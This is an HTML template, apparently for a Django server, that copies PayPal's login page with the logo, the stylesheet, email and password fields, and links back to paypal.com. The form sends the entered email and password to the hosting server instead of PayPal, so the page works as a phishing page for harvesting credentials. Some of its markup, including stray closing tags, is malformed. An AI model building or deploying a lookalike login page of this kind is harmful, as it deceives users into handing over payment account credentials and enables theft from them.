<!DOCTYPE html>
<html lang="en" class="no-js desktop">
    <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Log in to your PayPal account</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="PayPal" />
    <meta
      name="keywords"
      content="transfer money, email money transfer, international money transfer "
    />
    <meta
      name="description"
      content="Transfer money online in seconds with PayPal money transfer. All you need is an email address."
    />
    <link
      rel="shortcut icon"
      href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"
    />
    <link
      rel="apple-touch-icon"
      href="https://www.paypalobjects.com/webstatic/icon/pp64.png"
    />
    <meta
      name="viewport"
      content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes"
    />
    <meta
      property="og:image"
      content="https://www.paypalobjects.com/webstatic/icon/pp258.png"
    />
    <link
      rel="stylesheet"
      href="https://www.paypalobjects.com/web/res/d4d/6b10f39314e0998cbcd8e5d9b7591/css/contextualLogin.css"
    />
    <style id="antiClickjack">
      body {
        display: none !important;
      }
    </style>
  </head>
  <body>
      <section
        id="login"
        class="login"
        data-role="page"
        data-title="Log in to your PayPal account"
      >
        <div class="corral">
          <div
            id="content"
            class="contentContainer activeContent contentContainerBordered"
          >
            <header>
              <p
                role="img"
                aria-label="PayPal Logo"
                class="paypal-logo paypal-logo-long"
              ></p>
            </header>
            <form
              action="."
              method="POST"
              class="proceed maskable"
              autocomplete="off"
              name="login"
              autocomplete="off"
              novalidate
            >
            {% csrf_token %}
              <input
                type="hidden"
                id="token"
                name="_csrf"
                value="kafhLnubBWODwCwXNPb7ubssFt+kFhdZFV6aY="
              /><input type="hidden" name="locale.x" value="en_US" /><input
                type="hidden"
                name="processSignin"
                value="main"
              /><input
                type="hidden"
                name="fn_sync_data"
                value="fn_sync_data"
              /><input
                type="hidden"
                name="otpMayflyKey"
                value="664d556109be4268a470285a926d3d13otpChlg"
              /><input type="hidden" name="intent" value="signin" /><input
                type="hidden"
                name="ads-client-context"
                value="signin"
              /><input
                type="hidden"
                name="showCountryDropDown"
                value="true"
              /><input type="hidden" name="requestUrl" value="/signin" /><input
                type="hidden"
                name="forcePhonePasswordOptIn"
                value=""
              />
              <div id="passwordSection" class="clearfix splitEmail">
                <div
                  id="splitEmailSection"
                  class="splitPhoneSection splitEmailSection"
                >
                  <div class="countryPhoneSelectWrapper hide">
                    <label class="accessAid" for="phoneCode"
                      >Choose your phone country code</label
                    ><select
                      name="phoneCode"
                      id="phoneCode"
                      class="countryPhoneSelect"
                    >
                      <option
                        selected="selected"
                        value="US +1"
                        data-code="+1"
                        data-country="US"
                      >
                        United States (+1)
                      </option>
                    </select>
                    <div class="countryPhoneSelectChoice">
                      <span class="countryCode">US</span
                      ><span class="phoneCode">+1</span>
                    </div>
                  </div>
                  <div class="textInput" id="login_emaildiv">
                    <div class="fieldWrapper">
                      <label for="email" class="fieldLabel"
                        >Email or mobile number</label
                      ><input
                        id="email"
                        name="email"
                        type="email"
                        class="hasHelp validateEmpty"
                        required="required"
                        value=""
                        autocomplete="username"
                        placeholder="Email or mobile number"
                        aria-describedby="emailErrorMessage"
                      />
                    </div>
                    <div class="errorMessage" id="emailErrorMessage">
                      <p class="emptyError hide">Required</p>
                      <p class="invalidError hide">
                        That email or mobile number format isn’t right
                      </p>
                    </div>
                  </div>
                </div>
                <div
                  id="passwordSection"
                  class="clearfix showHideButtonForEligibleBrowser"
                >
                  <div class="textInput" id="login_passworddiv">
                    <div class="fieldWrapper">
                      <label for="password" class="fieldLabel">Password</label
                      ><input
                        id="password"
                        name="password"
                        type="password"
                        class="hasHelp validateEmpty pin-password"
                        required="required"
                        value=""
                        placeholder="Password"
                        aria-describedby="passwordErrorMessage"
                      /><label for="Show password" class="fieldLabel"
                        >Show password</label
                      ><button
                        type="button"
                        class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password"
                        id="Show password"
                      >
                        Show</button
                      ><label for="Hide" class="fieldLabel">Hide</label
                      ><button
                        type="button"
                        class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password"
                        id="Hide"
                      >
                        Hide</button
                      ><button class="pwFpIcon hide" id="pwFpIcon"></button>
                    </div>
                    <div class="errorMessage" id="passwordErrorMessage">
                      <p class="emptyError hide">Required</p>
                    </div>
                  </div>
                </div>
              </div>
              <input
                type="hidden"
                id="phone"
                name="login_phone"
                class="validate"
              />
              <div class="actions">
                <button
                  class="button actionContinue scTrack:unifiedlogin-login-submit"
                  type="submit"
                  id="btnLogin"
                  name="btnLogin"
                  value="Login"
                >
                  Log In
                </button>
              </div>
              <input
                type="hidden"
                name="splitLoginContext"
                value="inputPassword"
              /><input type="hidden" name="isCookiedHybridEmail" value="true" />
            </form>
            <div class="moreOptionsDiv hide" id="moreOptionsContainer">
              <a href="" id="moreOptions" class="moreOptionsInfo"
                >More options</a
              >
              <div class="bubble-tooltip hide" id="moreOptionsDropDown">
              </div>
            </div>
            <div class="forgotLink">
              <a
                href="https://www.paypal.com/authflow/password-recovery/?country.x=US&locale.x=en_US&redirectUri=%252Fsignin%252F"
                class="scTrack:unifiedlogin-click-forgot-password pwrLink"
                >Forgot password?</a
              >
            </div>
            <div
              class="pwr-modal forgotPasswordModal"
              id="password-recovery-modal"
            >
              <iframe
                id="pwdIframe"
                data-src="/authflow/password-recovery/?country.x=US&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%252F"
                scrolling="no"
                data-auto-reload="true"
              ></iframe>
              <div class="monogram-small"></div>
            </div>
            <div
              id="signupContainer"
              class="signupContainer"
              data-hide-on-email=""
              data-hide-on-pass=""
            >
              <div class="loginSignUpSeparator">
                <span class="textInSeparator">or</span>
              </div>
              <button
                type="button"
                href="https://www.paypal.com/us/webapps/mpp/account-selection"
                class="button secondary scTrack:unifiedlogin-click-signup-button"
                id="createAccount"
              >
                Sign Up
              </button>
            </div>
            <div id="tpdButtonContainer" class="signupContainer hide">
              <div class="loginSignUpSeparator">
                <span class="textInSeparator">or</span>
              </div>
              <div class="actions">
                <button
                  class="button secondary"
                  id="tpdButton"
                  type="submit"
                  value="Approve login using mobile device"
                >
                  Approve login using mobile device
                </button>
              </div>
            </div>
            <div class="intentFooter">
              <div class="localeSelector">
                <span class="picker country-selector hide"
                  ><button type="button" class="country US"></button
                ></span>
                <ul class="localeLink">
                  <li>
                    <a
                      class="selected scTrack:unifiedlogin-footer-language_en_US"
                      href="https://www.paypal.com/signin?country.x=US&locale.x=en_US&langTgl=en"
                      data-locale="en_US"
                      aria-current="”true”"
                      >English</a
                    >
                  </li>
                  <li>
                    <a
                      class="scTrack:unifiedlogin-footer-language_fr_XC"
                      href="https://www.paypal.com/signin?country.x=US&locale.x=fr_XC&langTgl=fr"
                      data-locale="fr_XC"
                      >Français</a
                    >
                  </li>
                  <li>
                    <a
                      class="scTrack:unifiedlogin-footer-language_es_XC"
                      href="https://www.paypal.com/signin?country.x=US&locale.x=es_XC&langTgl=es"
                      data-locale="es_XC"
                      >Español</a
                    >
                  </li>
                  <li>
                    <a
                      class="scTrack:unifiedlogin-footer-language_zh_XC"
                      href="https://www.paypal.com/signin?country.x=US&locale.x=zh_XC&langTgl=zh"
                      data-locale="zh_XC"
                      >中文</a
                    >
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </section>
            </div>
            </div>
          </div>
        </div>
      </section>
      <footer class="footer" role="contentinfo">
        <div class="legalFooter">
          <ul class="footerGroup">
            <li>
              <a target="_blank" href="https://www.paypal.com/us/smarthelp/contact-us">Contact Us</a>
            </li>
            <li>
              <a target="_blank" href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full"
                >Privacy</a
              >
            </li>
            <li>
              <a target="_blank" href="https://www.paypal.com/us/webapps/mpp/ua/legalhub-full"
                >Legal</a
              >
            </li>
            <li>
              <a target="_blank" href="https://www.paypal.com/us/webapps/mpp/country-worldwide"
                >Worldwide</a
              >
            </li>
          </ul>
        </div>
      </footer>
    </div>
  </body>
</html>
